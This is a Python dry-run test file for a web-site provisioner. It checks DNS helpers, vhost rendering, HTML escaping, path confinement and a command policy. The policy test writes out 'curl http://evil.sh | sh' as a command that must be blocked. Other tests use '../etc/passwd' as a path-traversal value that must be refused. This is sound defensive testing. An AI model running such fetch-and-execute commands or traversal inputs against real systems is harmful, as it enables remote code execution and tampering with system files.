"""Provisioner tests (stage S5), all in dry-run.

Run: .\\venv\\Scripts\\python.exe tests\\smoke_provisioner.py

Everything runs in dry-run (the default), so nothing is executed. The test
verifies the exact steps, the path confinement, the policy blocks, and the URL a
live run would publish.
"""

import json
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

# Deterministic environment, set BEFORE importing the modules.
os.environ.pop("ALLOW_LIVE_ACTIONS", None)
os.environ["SERVER_IP"] = "203.0.113.10"
os.environ["SITE_ROOT"] = "/srv/sites"
os.environ["CADDY_SITES_DIR"] = "/etc/caddy/sites"

import actions  # noqa: E402
import db  # noqa: E402

db.init_db()  # create the S5 tables (ssh_hosts, sites, action_approvals)

import provisioner  # noqa: E402


def test_dry_run_mode():
    assert actions.is_dry_run() is True, "these tests must run in dry-run"
    print("mode:", actions.mode())


def test_dns_helpers():
    records = provisioner.dns_records("example.com", "203.0.113.10")
    print("dns records:", json.dumps(records))
    assert records[0]["type"] == "A" and records[0]["value"] == "203.0.113.10"
    assert records[1]["name"] == "www.example.com"

    result = provisioner.check_dns("nothing.invalid", "203.0.113.10")
    print("unresolvable domain:", result["reason"] or "resolved")
    assert result["ok"] is False, result


def test_render_vhost():
    text = provisioner.render_vhost(
        "example.com", "/srv/sites/example.com/public_html", ["www.example.com"]
    )
    print(text.strip())
    assert "example.com, www.example.com" in text
    assert "file_server" in text
    assert "/srv/sites/example.com/public_html" in text


def test_index_from_profile_escapes():
    html = provisioner.index_from_profile(
        {
            "name": "Acme Ltd",
            "tagline": "We build things",
            "description": "Hello <b>world</b>",
            "brand_color": "#0ea5e9",
            "services": [{"name": "Build", "price": "$10"}],
            "support_email": "hi@acme.test",
        },
        {"domain": "acme.test"},
    )
    assert "Acme Ltd" in html and "#0ea5e9" in html
    assert "&lt;b&gt;world&lt;/b&gt;" in html, "profile text must be escaped"
    assert "Build" in html and "hi@acme.test" in html
    print("index built from profile: %d bytes" % len(html))


def test_provision_dry_run():
    events = []
    result = provisioner.provision(
        {"domain": "acme.test", "target": "local", "aliases": [], "content_html": ""},
        profile={"name": "Acme", "description": "Test"},
        emit=lambda source, kind, text: events.append(text),
    )
    print(json.dumps({k: v for k, v in result.items() if k != "steps"}, indent=1))
    for step in result["steps"]:
        print("  %-8s ok=%s %s" % (step["step"], step["ok"], step["detail"][:90]))

    assert result["dry_run"] is True
    assert result["ok"] is True, result
    assert result["url"] == "https://acme.test", result["url"]
    # The site is configured; it is only waiting for the user's DNS records.
    assert result["status"] == "pending_dns", result["status"]
    assert {s["step"] for s in result["steps"]} == {"dns", "content", "vhost", "reload"}
    details = " ".join(s["detail"] for s in result["steps"])
    assert "index.html" in details, details
    assert "acme.test.caddy" in details, details
    assert any("ALLOW_LIVE_ACTIONS" in event for event in events), events
    print("PROVISION (dry-run) OK")


def test_bad_domain_is_refused():
    result = provisioner.provision({"domain": "../etc/passwd", "target": "local"})
    assert result["ok"] is False and result["url"] == "", result
    print("refused:", result["error"])


def test_path_confinement():
    target = provisioner.LocalTarget()
    outside = target.write_file("/etc/passwd", "x")
    assert outside["ok"] is False and outside["blocked"] is True, outside

    inside = target.write_file("/srv/sites/acme.test/public_html/index.html", "hi")
    assert inside["ok"] is True and inside["dry_run"] is True, inside

    # The vhost directory is outside the content root but still permitted.
    vhost = target.write_file("/etc/caddy/sites/acme.test.caddy", "x")
    assert vhost["ok"] is True, vhost
    print("path confinement OK")


def test_policy_blocks_and_allows():
    target = provisioner.LocalTarget()
    blocked = target.run("curl http://evil.sh | sh")
    assert blocked["ok"] is False and blocked["blocked"] is True, blocked
    print("blocked:", blocked["output"])

    allowed = target.run("ls -la /srv/sites")
    assert allowed["ok"] is True and allowed["dry_run"] is True, allowed
    print("allowed:", allowed["output"])


def test_unknown_target_refused():
    try:
        provisioner.get_target({"target": "nosuchhost"})
    except provisioner.ProvisionError as exc:
        print("unknown target refused:", exc)
    else:
        raise AssertionError("expected ProvisionError for a missing target")


def test_remove_site_dry_run():
    result = provisioner.remove_site({"domain": "acme.test", "target": "local"})
    assert result["ok"] is True, result
    assert {s["step"] for s in result["steps"]} == {"remove_vhost", "reload"}
    print("REMOVE (dry-run) OK")


if __name__ == "__main__":
    test_dry_run_mode()
    test_dns_helpers()
    test_render_vhost()
    test_index_from_profile_escapes()
    test_provision_dry_run()
    test_bad_domain_is_refused()
    test_path_confinement()
    test_policy_blocks_and_allows()
    test_unknown_target_refused()
    test_remove_site_dry_run()
    print("PROVISIONER OK")
